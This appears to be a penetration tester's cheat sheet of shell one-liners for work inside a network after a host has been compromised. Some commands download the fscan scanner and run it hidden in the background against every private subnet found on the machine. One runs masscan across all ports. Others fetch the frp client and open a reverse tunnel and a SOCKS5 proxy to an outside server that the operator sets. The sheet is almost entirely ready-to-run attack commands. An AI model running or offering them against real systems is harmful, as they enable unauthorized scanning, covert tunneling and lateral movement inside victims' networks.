## Quick and easy to use fscan.
```
curl -#L https://github.com/shadow1ng/fscan/releases/download/1.8.3/fscan -o /tmp/fscan && chmod +x /tmp/fscan && (nohup /tmp/fscan -h /24 -o /tmp/results.txt > /dev/null 2>&1 &) && echo FscanRunning

ip a| grep -oE "\b(10|172\.(1[6-9]|2\d|3[01])|192\.168)\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]{1,3}\b" | xargs -I {} bash -c "nohup ~/Pentest/Intranet/fscan -h {} -o /tmp/results.txt > /dev/null 2>&1 &"

curl -#L https://github.com/shadow1ng/fscan/releases/download/1.8.3/fscan -o /tmp/fscan && chmod +x /tmp/fscan && (ip a| grep -oE "\b(10|172\.(1[6-9]|2\d|3[01])|192\.168)\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]{1,3}\b" | xargs -I {} bash -c "nohup ~/Pentest/Intranet/fscan -h {} -o /tmp/results.txt > /dev/null 2>&1 &") && echo FscanRunning

```

## Quick and easy to use Masscan -> results.txt`ip:port`
```
sudo masscan -p- --rate=1000 -iL ../ips.txt -oL results.txt && awk '{print $4 ":" $3}' results.txt
```

## Quick and easy to use frpc.
**`Frpc 0:8088 -> frp:8088`**
```
curl -#L https://github.com/fatedier/frp/releases/download/v0.53.2/frp_0.53.2_linux_amd64.tar.gz | tar -zvxO --wildcards frp_*/frpc > /tmp/frpc && (nohup /tmp/frpc tcp -n $RANDOM -l 8088 -r 8088 -s FrpIP -P 7000 >/dev/null 2>&1 &) && echo FrpRunning
```
**`Frpc Socks5-Proxy -> frp:1087 -> 0.0.0.0/24`**
```
FrpsIP= && FrpsPort=7000 && config="""[common]\nserver_addr = $FrpsIP\nserver_port = $FrpsPort\n[s0cks5]\ntype = tcp\nplugin = socks5\nremote_port = 1087\n""" && curl -#L https://github.com/fatedier/frp/releases/download/v0.53.2/frp_0.53.2_linux_amd64.tar.gz | tar -zvxO --wildcards frp_*/frpc > /tmp/frpc && echo -e $config > /tmp/frpc.toml && (nohup /tmp/frpc -c /tmp/frpc.toml >/dev/null 2>&1 &) && echo FrpSocksProxyRunning
```
